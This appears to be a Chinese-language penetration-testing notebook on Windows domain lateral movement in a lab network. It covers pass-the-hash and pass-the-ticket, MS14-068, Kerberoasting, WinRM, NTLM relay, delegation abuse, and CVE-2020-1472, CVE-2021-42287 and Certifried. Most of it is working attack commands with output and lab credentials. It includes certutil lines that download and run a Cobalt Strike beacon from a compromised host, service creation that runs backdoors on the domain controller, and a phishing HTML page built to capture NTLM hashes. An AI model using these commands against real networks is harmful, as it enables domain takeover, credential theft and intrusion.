那么我们这里思考一下，为什么我们能抓到域控god的 HTLM 值呢？原因是我么这台已失陷的主机 webserver 有过和域控主机通信的记录，缓存在内存里了。如何确定这个HTML就是域控的呢？我们可以使用之前用过的密码喷射 CrackMapExec 实验

```
#以下直接在 cs 的 beacon 里运行
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.21 /ntlm:ccef208c6485269c20db2cad21734fe7
```

此时我们的 webserver 上出现了一个 cmd 窗口，连接下域控，显示成功

<img src=".\图片\Snipaste_2022-12-13_20-39-51.png" alt="Snipaste_2022-12-13_20-39-51"  />

这时我们该如何上线cs呢？可以与域控建立连接后直接copy，注意这时 cs 生成的后门得使用转发上线

```
kali: 192.168.0.103
webserver : 192.168.0.102  192.168.3.31  # 2张网卡
god: 192.168.3.21
```

```
#在弹出的 cmd 里运行
copy C:\Users\webadmin\Desktop\4444.exe \\192.168.3.21\c$
sc \\192.168.3.21 create bshell binpath= "c:\4444.exe" #192.168.3.21是OWA2010CN-God的主机ip地址可换为主机名
sc \\OWA2010CN-God start bshell 
#以上的命令是创建一个 bshell 服务指向 c:\4444.exe 并启动
```

<img src=".\图片\Snipaste_2022-12-13_21-00-47.png" alt="Snipaste_2022-12-13_21-00-47"  />

#### impacket套件

此时还是最好建立cs上的代理，然后本地运行 Proxifler 启动 python 走代理

```
psexec -hashes :NTLM值 域名/域用户@域内ip地址    # ./用户 为本地用户 ， god\域用户 为域用户
smbexec -hashes :NTLM值 域名/域用户@域内ip地址
wmiexec -hashes :NTLM值 域名/域用户@域内ip地址

D:\Myproject\venv\Scripts\python.exe psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
D:\Myproject\venv\Scripts\python.exe smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
D:\Myproject\venv\Scripts\python.exe wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
#执行结束后会返回一个cmd会话
```

提一下棱角社区里面可以找到下载执行文件的命令，https://forum.ywhack.com/bountytips.php?download

```
certutil.exe -urlcache -split -f http://XX.XX.XX.XX:80/1.exe 1.exe & 1.exe
```

### PTT票据传递

PTT攻击的部分就不是简单的NTLM认证了，它是利用**Kerberos协议认证**进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接

我们假设 PTT 票据类似于 web 里的 Cookie 和 Session ，当域内用户经过通讯后（使用dir \\192.168.3.21\$ 和远程桌面连接输入账号密码也算），这时会在本地生成一些票据，我们拿着这些票据就可能可以与目标机进行通讯从而取得权限。

#### Kerberos 认证

<img src=".\图片\Snipaste_2022-12-13_21-28-57.png" alt="Snipaste_2022-12-13_21-28-57"  />

1. 首先 Client 向域控制器 DC 请求访问 Server，DC 通过去AD 活动目录中查找依次区分 Client 来判断 Client 是否可信

2. 认证通过后返回 TGT 给 Client，Client 得到 TGT（Ticket Granting Ticket）

3. Client 继续拿着 TGT 请求 DC 访问 Server，TGS 通过Client 消息中的TGT，判断 Client 是否有访问权限

4. 如果有，则给 Client 有访问 Server 的权限 Ticket，也叫ST（Service Ticket）

5. Client 得到 Ticket 后，再去访问 Server，且该 Ticket 只针对这一个Server 有效

6. 最终 Server 和 Client 建立通信

#### MS14068漏洞

利用漏洞**伪造**生成的用户的**新身份票据**去尝试认证，MS14-068造成的危害是允许**域内任何一个普通用户**，将自己提升至域管权限。微软给出的补丁是 kb3011780

#以下在cs的beacon里操作

```
beacon> shell whoami/user  #获取域普通用户 SID 值
用户信息
----------------

用户名       SID                                           
============ ==============================================
god\webadmin S-1-5-21-1218902331-2157346161-1782232778-1132
```

```
beacon> shell klist  # 查看存在的票据
当前登录 ID 是 0:0x8f493
缓存的票证: (3)
#0>	客户端: webadmin @ GOD.ORG
	服务器: krbtgt/GOD.ORG @ GOD.ORG
	Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)
	票证标志 0x40e00000 -> forwardable renewable initial pre_authent 
	开始时间: 12/13/2022 20:27:57 (本地)
	结束时间:   12/14/2022 6:27:57 (本地)
	续订时间: 12/20/2022 20:27:57 (本地)
	会话密钥类型: RSADSI RC4-HMAC(NT)
#1>	客户端: webadmin @ GOD.ORG
	服务器: ldap/owa2010cn-god.god.org @ GOD.ORG
	Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96
	票证标志 0x40a40000 -> forwardable renewable pre_authent ok_as_delegate 
	开始时间: 12/13/2022 20:27:59 (本地)
	结束时间:   12/14/2022 6:27:57 (本地)
	续订时间: 12/20/2022 20:27:57 (本地)
	会话密钥类型: AES-256-CTS-HMAC-SHA1-96
#2>	客户端: webadmin @ GOD.ORG
	服务器: LDAP/OWA2010CN-God.god.org/god.org @ GOD.ORG
	Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96
	票证标志 0x40a40000 -> forwardable renewable pre_authent ok_as_delegate 
	开始时间: 12/13/2022 20:27:57 (本地)
	结束时间:   12/14/2022 6:27:57 (本地)
	续订时间: 12/20/2022 20:27:57 (本地)
	会话密钥类型: AES-256-CTS-HMAC-SHA1-96
```

```
beacon> shell klist purge  # 清除票据
```

```
beacon> shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45  # 生成伪造的票据
```

```
beacon> mimikatz kerberos::ptc TGT_webadmin@god.org.ccache # 导入票据到内存
```

```
beacon> shell dir \\OWA2010CN-GOD\c$  # 建立连接到域控
[*] Tasked beacon to run: dir \\OWA2010CN-GOD\c$
[+] host called home, sent: 53 bytes
[+] received output:
 驱动器 \\OWA2010CN-GOD\c$ 中的卷没有标签。
 卷的序列号是 109F-E998

 \\OWA2010CN-GOD\c$ 的目录

2022/12/13  20:50           295,936 4444.exe
2018/12/23  09:28    <DIR>          ExchangeSetupLogs
2018/12/22  16:54    <DIR>          inetpub
2018/12/23  09:12    <DIR>          Program Files
2018/12/22  23:58    <DIR>          Program Files (x86)
2019/03/14  17:58    <DIR>          tools
2018/12/22  16:55    <DIR>          Users
2022/12/13  14:59    <DIR>          Windows
               1 个文件        295,936 字节
               7 个目录 26,968,731,648 可用字节
```

<img src=".\图片\Snipaste_2022-12-13_21-56-08.png" alt="Snipaste_2022-12-13_21-56-08" style="zoom:80%;" />

后续cs上线

```
shell net use \\OWA2010CN-GOD\C$
copy beacon.exe \\OWA2010CN-GOD\C$
sc \\OWA2010CN-GOD create bindshell binpath= "c:\beacon.exe"
sc \\OWA2010CN-GOD start bindshell
```

运用 MS14068 漏洞成功与否，看补丁打没有 kb3011780

#### kekeo

需要**高权限**，需NTLM，利用获取的NTLM生成新的票据尝试认证

因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗

缺点：票据是有有效期的，从你导出票据的那一刻开始一般为10个小时，所以如果当前主机在连接过域控的话，有效期内可利用

```
beacon> shell kekeo "tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7" "exit"  # 生成票据
```

```
beacon> shell kekeo "kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi" "exit"  #导入票据
```

```
beacon> shell dir \\owa2010cn-god\c$  #尝试连接
```

<img src=".\图片\Snipaste_2022-12-13_22-06-19.png" alt="Snipaste_2022-12-13_22-06-19"  />

注意，这里能否成功看你的 NTLM 哈希值 是否正确 ，这里如何获取 NTLM 值 ？如何对应上是域内那个用户的哈希值呢？

还是域内用户连接通信过，内存里会**缓存一些凭证**其中包括  NTLM 值 ，再利用**密码喷射**实验一一对应上

#### mimikatz

需要**高权限**，需要票据Ticket，利用**历史遗留的票据**重新认证尝试，因为之前我们两台域内主机通信连接过了，应该会有一些历史遗留的票据存在，我们先导出这些票据，再导入到内存，再尝试连接

导出票据

```
beacon> mimikatz sekurlsa::tickets /export
```

导入票据到内存，这里要筛选票据，要对应上域控，查看票据文件名的的特征

```
beacon> mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;8f493]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi
```

利用票据连接

```
beacon> mimikatz sekurlsa::tickets /export
```

<img src=".\图片\Snipaste_2022-12-13_22-25-28.png" alt="Snipaste_2022-12-13_22-25-28"  />

注意，这里成不成功要看历史遗留的票据对不对，也是要看这两台主机有通信连接过吗，**通信连接**可以是使用 dir \\192.168.3.21\$ 或者远程桌面连接输入账号密码等等

#### 密码喷射

这里密码喷射重点是查看**用户**是否和 **NTLM值** 对不对应得上，方便我们生成票据，利用CrackMapExec对hash值进行验证

```
#域用户HASH登录
proxychains4 CrackMapExec smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c 
#本地用户HASH登录
proxychains4 CrackMapExec smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth
```

#### 票据传递总结

没有用思考过，我们用哈希传递就可以完成目的拿shell了，为什么要用根据哈希值导入的票据传递呢？

因为哈希传递的一些工具， psexec  、wmiexec  、smbexec 这样一些套件的功能，是根据 **NTLM认证 **的，走的**端口和协议**也都不尽相同，假如我们防火墙限制了一些协议或者对应端口没开放，就很难办了。

这时我们使用的票据传递是基于 **Kerberos 认证** 的，可以回避掉一些哈希传递遇到的一些问题

### PTK

当系统**安装了KB2871997补丁**且**禁用了NTLM**的时候，那我们抓取到的ntlm hash也就失去了作用，但是可以通过 PTK 的攻击方式获得权限

```
mimikatz sekurlsa::ekeys
mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值
```

显然这种利用条件很苛刻，看情况使用吧

### RDP

远程桌面服务 支持明文及HASH连接，端口 3389
**条件**：对方开启RDP服务 远程桌面

注意：这时已经取得了 sqlserver 主机的用户名密码或 NTLM 值

```
kali 192.168.0.103
webserver  192.168.0.102  192.168.3.31 # 2张网卡
sqlserver 192.168.3.32
win10 192.168.0.101
```

webserver 为我们已攻陷主机，我们想要 win10 能远程桌面连接 sqlserver ，毕竟直接用 websever 远程桌面连接 sqlserver 不现实嘛

这时我们有 2 个思路：

#### 思路1

1、webserver 上线 kali 的 cs，在 kali 上建立代理节点 socks ，再到 win10 上用 Proxifler 工具连接节点后远程桌面连接 

```
# cs 内置端口扫描3389 初始探针
tasklist /svc | find "TermService" # 找到对应服务进程的PID
netstat -ano | find "PID值" # 找到进程对应的端口号
# 我们这里详细演示方法2
```

#### 思路2

2、用 lcx 端口转发工具 ，把 192.168.3.32:3389 转发到 192.168.0.102:1234上 ，再用 win10 远程桌面连接 192.168.0.102:1234

```
lcx.exe -tran 1234 192.168.3.32 3389  # webserver 运行
mstsc /console /v:192.168.0.102:1234 /admin # win10 运行 
```

<img src=".\图片\Snipaste_2022-12-14_13-11-21.png" alt="Snipaste_2022-12-14_13-11-21" style="zoom:60%;" />

此外还可用mimikatz，使用hash值连接

```
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.0.102:1234 /ntlm:518b98ad4178a53695dc997aa02d455c "/run:mstsc /restrictedadmin"
```

此时我们看到 sqlserver 有两个用户同时登录 ，且不冲突，假如在 god\dbadmin 用户已经登录的情况下 我们再 远程连接使用同一个用户 god\dbadmin 登录，那么会把原来已登录的账号挤下线

<img src=".\图片\Snipaste_2022-12-14_13-15-50.png" alt="Snipaste_2022-12-14_13-15-50" style="zoom:60%;" />

### WinRM 服务

WinRM代表Windows远程管理，是一种允许管理员远程执行系统管理任务的**服务**。
默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。

#### 利用条件：

**双方都启用**的Winrm rs的服务！
使用此服务需要**管理员级别**凭据。
Windows 2008 以上版本**默认自动开启**状态，Windows Vista/win7上必须手动启动；
Windows 2012之后的版本默认允许远程任意主机来管理。

仍需要对应的账号密码凭证

用 cs 在已经攻陷的主机开启 WinRM 服务

```
beacon> shell winrm quickconfig -q
beacon> shell winrm set winrm/config/Client @{TrustedHosts="*"}
```

#### 步骤1：探针

cs 内置扫描端口 5985 ，发现 192.168.3.32:5985 和 192.168.3.31:5985 存活

<img src=".\图片\Snipaste_2022-12-14_13-45-01.png" alt="Snipaste_2022-12-14_13-45-01" style="zoom:60%;" />

```
# 检查 WinRM 服务状态
powershell Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
```

#### 步骤2：连接执行

注意在 cs 的 beacon 运行无效 ，还是得在 webserver 里的 cmd 里运行

```
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami
winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami
```

<img src=".\图片\Snipaste_2022-12-14_13-55-26.png" alt="Snipaste_2022-12-14_13-55-26" style="zoom: 80%;" />

步骤3：上线cs

```
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe beacon.exe & beacon.exe"

# http://192.168.3.31/beacon.exe 为已攻陷主机 webserver 上的后门
```

### Kerberos协议RC4加密

使用场景：当mimikatz**没有成功抓取密码及hash时**。采用的横向手法

黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。
DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。
请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5(注意这里的RC4只有**加密类型为RC4**才可以进行破解利用，而AES256加密无法利用)，这意味着服务帐户的NTLM密码哈希用于加密服务票证。
黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。
如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证，从而实现 PTT传递或者 PTH传递

#### Spn

Spn是 ：Windows域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组，集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。在域环境中运行的大量应用包含了多种资源，为资源的合理分组、分类和再分配提供了便利。微软给域内的每种资源分配了不同的**服务主体名称**(Service Principal Name, SPN)

用Spn探针内网中的服务 [域渗透之SPN-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/219934#h3-5)

```
setspn -T god.org -q */*
setspn -T god.org -q */* | findstr "MSSQL"
```

```
正在检查域 DC=god,DC=org
CN=OWA2010CN-GOD,OU=Domain Controllers,DC=god,DC=org
	exchangeRFR/OWA2010CN-GOD
	exchangeRFR/OWA2010CN-God.god.org
	exchangeMDB/OWA2010CN-God.god.org
	exchangeMDB/OWA2010CN-GOD
	exchangeAB/OWA2010CN-GOD
	exchangeAB/OWA2010CN-God.god.org
	SMTP/OWA2010CN-GOD
。。。。。。。。。
# 详情见 .\图片\spn.txt	
```

使用 klist 看票据时，会话密匙类型 为 RC4 时才有可能破解密码，这里是 AES

<img src=".\图片\Snipaste_2022-12-14_14-13-11.png" alt="Snipaste_2022-12-14_14-13-11" style="zoom:50%;" />

#### 步骤1：检测脆弱可解密的凭据

这个得用vs生成.exe再使用https://zhuanlan.zhihu.com/p/474523090

https://github.com/GhostPack/Rubeus

```
./Rubeus.exe kerberoast
```

<img src=".\图片\Snipaste_2022-12-14_15-06-20.png" alt="Snipaste_2022-12-14_15-06-20" style="zoom:60%;" />

#### 步骤2：人工请求服务

```
powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SqlServer.god.org:1433"  #powershell请求服务

mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433 #mimikatz请求服务
```

<img src=".\图片\Snipaste_2022-12-14_14-31-44.png" alt="Snipaste_2022-12-14_14-31-44" style="zoom:80%;" />

导出票据，因为请求 MSSQLSvc/SqlServer.god.org:1433 后会在内存里缓存票据，再klist查看是否为 RC4 加密

<img src=".\图片\Snipaste_2022-12-14_14-32-15.png" alt="Snipaste_2022-12-14_14-32-15" style="zoom:67%;" />

#### 步骤3：导出对应票据

```
mimikatz kerberos::list /export
```

#### 步骤4：本地破解票据

https://github.com/nidem/kerberoast

```
#pass.txt为密码字典 根据前期信息搜集填入
python tgsrepcrack.py pass.txt "1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi"
```

#### 步骤5：获得明文密码哈希或票据传递

详情见之前的哈希或票据传递

### Exchange

内网域里一般会搭建 Exchange 邮件服务，哪些版本报过漏洞，我们得知道

https://www.cnblogs.com/xiaozi/p/14481595.html

<img src=".\图片\AgAABTZwlSJ4xlyQ3v9EO6lugXy7yVVN.png" alt="AgAABTZwlSJ4xlyQ3v9EO6lugXy7yVVN" style="zoom:80%;" />

#### Exchange探针

1、端口扫描

exchange会对外暴露接口如OWA,ECP等，会暴露在80端口，而且25/587/2525等端口上会有SMTP服务，所以可以通过一些端口特征来定位exchange

<img src=".\图片\1665110205173-0e658ae5-f225-4c9b-aa92-cee048584c59.png" alt="1665110205173-0e658ae5-f225-4c9b-aa92-cee048584c59"  />

2、SPN扫描

```
powershell setspn -T 0day.org -q */*
```

3、脚本探针

https://github.com/3gstudent/Homework-of-Python/blob/master/Exchange_GetVersion_MatchVul.py

```
python Exchange_GetVersion_MatchVul.py xx.xx.xx.xx
```

4、发现对应版本

用 Exchange_GetVersion_MatchVul.py 脚本也可以，我们查看邮件网站的源码也可以发现

#### 搭建在外网或内网

在外网时还是先找已知版本爆出过的漏洞，不行再尝试爆破账号密码，邮件服务登录的账号密码一般为域内用户的账号密码

在内网时也是一样思路，此时我们肯定已经取得了一些域内用户的账号或密码，爆破难度大大降低，在内网利用Exchange服务时可以考虑**钓鱼邮件**

#### 漏洞利用

寻找对应exp直接打就行，邮件服务搭在内网时我们要建立节点开代理访问

<img src=".\图片\image-20221007151542981.png" alt="image-20221007151542981"  />

### 利用漏洞打域控

这里就是利用已知漏洞打域控，简述操作，永恒之蓝 CVE-2017-0146（MS17010）和 CVE-2014-6324 就不在这里操作了，因为之前都操作过，就找几个新点的漏洞做漏洞复现吧

#### CVE-2022-269234

当Windows系统的Active Directory证书服务（CS）在域上运行时，由于机器账号中的dNSHostName属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。
**影响**：Win8.1、Win10、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022等版本

##### 条件

1、一个域内普通账号    2、域内存在证书服务器

##### 步骤

```
Kali添加访问域内信息 /etc/hosts
192.168.1.15 xiaodi.local
192.168.1.15 xiaodi-WIN-3C7SS32SQ6R-CA
192.168.1.15 WIN-3C7SS32SQ6R.xiaodi.local
```

获取CA结构名和计算机名

```
certutil -config - -ping
```

然后在攻击主机上安装 certipy 工具 然后使用命令

```
certipy req -username boss@god.org -password Admin12345 -ca "god-OWA2010CN-GOD-CA" -target "god-OWA2010CN-GOD-CA.god.org" -template User  //申请低权限用户证书
1、申请低权限用户证书：
certipy req 'xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local' -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug
2、检测证书
certipy auth -pfx test.pfx
3、创建一个机器账户：
python3 bloodyAD.py -d xiaodi.local -u test -p 'Pass123' --host 192.168.1.15 addComputer pwnmachine 'CVEPassword1234*'
4、设置机器账户属性(dNSHostName和DC一致)：
python3 bloodyAD.py -d xiaodi.local -u test -p 'Pass123' --host 192.168.1.15 setAttribute 'CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local' dNSHostName '["WIN-3C7SS32SQ6R.xiaodi.local"]'
5、再次申请证书：
certipy req 'xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.1.15' -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA
6、检测证书：
certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15
7、导出HASH：
python3 secretsdump.py 'xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local' -hashes :10e02bef2258ad9b239e2281a01827a4
8、利用HASH：
python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd
```

#### CVE-2021-42287

前提条件：一个域内普通账号
影响版本：Windows基本全系列

##### 前置

proxifier 开启代理，绑定hosts 

```
192.168.3.21 god.org OWA2010CN-God.god.org
```

##### 步骤

1、扫描探针：

https://github.com/cube0x0/noPac

```
noPac scan -domain god.org -user webadmin -pass admin!@#45
```

<img src=".\图片\Snipaste_2022-12-14_19-59-55.png" alt="Snipaste_2022-12-14_19-59-55" style="zoom:80%;" />

2、利用连接

```
noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt
```

<img src=".\图片\Snipaste_2022-12-14_20-02-30.png" alt="Snipaste_2022-12-14_20-02-30" style="zoom:67%;" />

<img src=".\图片\Snipaste_2022-12-14_20-05-41.png" alt="Snipaste_2022-12-14_20-05-41" style="zoom:67%;" />

3、PsExec 测试

```
PsExec.exe \\owa2010cn-god.god.org cmd.exe
```

##### 一键利用脚本

python一键利用
https://github.com/WazeHell/sam-the-admin

```
python sam_the_admin.py "god.org/webadmin:admin!@#45" -dc-ip 192.168.3.21 -shell
```

#### CVE-2020-1472

影响范围极广

利用条件 只需要一台域内主机权限即可，原理是重置域控密码

##### 步骤

获取域控计算机名

```
net time /domain
```

添加hosts

```
192.168.3.21 god.org OWA2010CN-God.god.org
```

在cs上建立代理节点后 ，连接DC清空凭证 https://github.com/dirkjanm/CVE-2020-1472

```
proxychains4 python cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21
```

获取域内HASH https://github.com/SecureAuthCorp/impacket

```
proxychains4 python secretsdump.py OWA2010CN-GOD\$@192.168.3.21 -just-dc -no-pass
```

连接域控PTH

```
proxychains4 python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
```

后续恢复密码

如果不恢复密码会对域环境造成严重破坏
https://github.com/risksense/zerologon

### NTLM 重放

与NLTM认证相关的安全问题主要有Pass The Hash、利用NTLM进行信息收集、Net-NTLM Hash破解、NTLM Relay几种。PTH前期已经了，运用mimikatz、impacket工具包的一些脚本、CS等等都可以利用，NTLM Relay又包括（relay to smb,ldap,ews）
可以应用在**获取不到明文或HASH时**采用的手法，但也要注意手法的必备条件。

#### 原理

当使用 smb 协议的 **dir  \\\192.168.3.32\c$** 命令进行访问目标机时，NLTM认证会使用**原主机的账号密码**去比对**目标机的账号密码**，当然也使用 ldap,ews 等协议时去比对也一样。当用户名和密码都一样时比对成功，就可以访问目录执行命令了。这里不需要知道目标机甚至已攻陷主机的账号密码，直接执行命令去比对即可。

由于以上性质，在内网域中最好都使用本机 administrator 用户去比对账号密码，因为两台域内用户名密码肯定不一样呀

用 administrator 用户比对账号密码，且两边账号密码一致时

<img src=".\图片\Snipaste_2022-12-16_16-04-54.png" alt="Snipaste_2022-12-16_16-04-54"  />

用 administrator 用户比对账号密码，且两边账号密码不一致时

<img src=".\图片\Snipaste_2022-12-16_16-09-28.png" alt="Snipaste_2022-12-16_16-09-28"  />

#### 实验利用

这时根据重放攻击的原理，在msf/cs 工具上的利用

```
webserver 192.168.3.31 192.168.0.102   .\administrator,admin!@#45
sqlserver 192.168.3.32                 .\administrator,admin!@#45
kali      192.168.0.103
God.org   192.168.3.21                 god\administrator,Admin12345
```

##### cs 转移到 msf

cs转移权限

<img src=".\图片\Snipaste_2022-12-16_16-30-34.png" alt="Snipaste_2022-12-16_16-30-34" style="zoom:80%;" />

```
beacon> spawn msf
```

msf监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 1112
run
```

##### 切换权限administrator

cs

```
beacon> ps               #查看进程
beacon> steal_token 2932 #窃取pid值为2932的进程
```

msf

```
meterpreter > ps
meterpreter > migrate 900
```

##### smb重发上线

添加路由

```
run autoroute -p #查看当前路由表
run post/multi/manage/autoroute #添加当前路由表
background #返回
```

重发模块

```
use exploit/windows/smb/smb_relay
set smbhost 192.168.3.32  #转发攻击目标 sqlserver
set lhost 192.168.0.103   #设置kali IP
set autorunscript post/windows/manage/migrate
```

主动连接

```
set payload windows/meterpreter/bind_tcp  #主机不出网采用正向连接
set rhost 192.168.3.32 #设置连接目标
run
```

administrator触发上线

```
beacon> shell dir \\192.168.0.103\c$   
#此时 kali 192.168.0.103 这时候体现的是转发流量的作用，相当于 dir \\192.168.3.32\c$
```

失败了没上线成功，但是抓取到 webserver 的账号和密码

```
cated against relay target smb://192.168.3.32:445
[SMB] NTLMv2-SSP Client     : 192.168.3.32
[SMB] NTLMv2-SSP Username   : WEBSERVER\Administrator
[SMB] NTLMv2-SSP Hash       : Administrator::WEBSERVER:8d4dfefef3bc9b8f:95cafccf0728de802af902db71e1506f:0101000000000000faff5d9d2b11d9019fcaae9013d5c8b5000000000200060047004f00440001001200530051004c0053004500520056004500520004000e0067006f0064002e006f007200670003002200530071006c005300650072007600650072002e0067006f0064002e006f007200670005000e0067006f0064002e006f007200670007000800faff5d9d2b11d90106000400020000000800300030000000000000000000000000300000de64d75d9e8ea7de49a7236f1ffd3457a9ffd4415cc3143e69ca744196437a590a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0030002e00310030003300000000000000000000000000
```

### NTLM中继攻击

条件：被控主机当前管理员权限

当目标机器连接我们已攻陷的机器时，会走一些协议，我们可以在已攻陷的机器上监听，对面连接过来时我们可以截取到一些凭证

可以配合web或邮件钓鱼使用，引诱目标机器访问已攻陷的主机

https://github.com/Kevin-Robertson/Inveigh  工具在已攻陷的主机上监听

##### 步骤

1、监听拦截

```
Inveigh.exe
```

获取到的是NET NTLM HASH V1或V2

2、直接触发

```
dir \\192.168.3.31\c$
```

3、钓鱼触发

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <img src="file:///\\192.168.3.32\2">
</body>
</html>
```

4、破解密文

```
hashcat -m 5600 [hash] pass.txt --show
```

### 非约束委派

#### 域委派是什么

是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事

注意：能够被委派的用户只能是服务账号或者机器账号

**主机账号**：活动目录中的computers组内的计算机，也被 称为机器账号

**服务账号**：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加 入域内，比如：SQLServer,MYSQL等；域用户通过注册 SPN 也能成为服务账号

#### 原理

user访问serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，如果是非约束委派的 话，会把用户的TGT放在ST票据中并一起发送给serverA 这样serverA在验证ST票据的同时也获取到了 用户的TGT，并把TGT储存在自己的lsass进程中以备下次重用，从而**serverA就可以使用这个TGT 来模拟这个user访问任何服务**

域控配置    

```
setspn -U -A priv/test webadmin
```

<img src=".\图片\Snipaste_2022-12-16_22-16-45.png" alt="Snipaste_2022-12-16_22-16-45" style="zoom:67%;" />

#### 利用场景

要么等**域控来主动访问**你这台**已经攻陷的带非约束委派的主机**，就可以缓存域控票据并导入票据后来连接域控

要么**钓鱼**，诱导域控来访问该已经**攻陷的带非约束委派的主机**，然后得到管理员的TGT，从而模拟域管用户

#### 步骤

查询域内设置了非约束委派的服务账户

```
AdFind -b "DC=god,DC=org" -f ((samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```

查询域内设置了非约束委派的机器账户

```
AdFind -b "DC=god,DC=org" -f ((samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```

##### 域控主动连接

```
net use \\webserver
```

<img src=".\图片\Snipaste_2022-12-16_22-36-17.png" alt="Snipaste_2022-12-16_22-36-17"  />

导出票据到本地

```
beacon> mimikatz sekurlsa::tickets /export
```

导入票据到内存

```
beacon> mimikatz kerberos::ptt [0;9044d]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi
```

连接域控

```
beacon> shell dir \\owa2010cn-god\c$
```

<img src=".\图片\Snipaste_2022-12-16_22-38-57.png" alt="Snipaste_2022-12-16_22-38-57" style="zoom:67%;" />

##### 钓鱼

建立网址

http://192.168.3.31/zfy.html

```
<!DOCTYPE html>
<html>
<head>
<title></title>
</head>
<body>
<img src="file:///\\192.168.3.31\2">
</body>
</html>
```

导出票据到本地

```
beacon> mimikatz sekurlsa::tickets /export  #[0;e9165]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi
```

导入票据到内存

```
beacon> mimikatz kerberos::ptt [0;e9165]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi
```

连接域控

```
beacon> shell dir \\owa2010cn-god\c$
```

<img src=".\图片\Snipaste_2022-12-16_22-47-03.png" alt="Snipaste_2022-12-16_22-47-03" style="zoom:67%;" />

### 约束委派

由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)

**S4U2self**
允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等

**S4U2proxy**
允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务

如果攻击者控制了服务 A 的账号，并且服务 A 配置了到域控的 CIFS 服务的约束性委派。则攻击者可以先使用 S4u2seflt 申请域管用户（administrator）访问 A 服务的 ST1 ，然后使用 S4u2Proxy 以 administrator 身份访问域控的 CIFS 服务，即相当于控制了域控

#### 环境配置

配置SPN

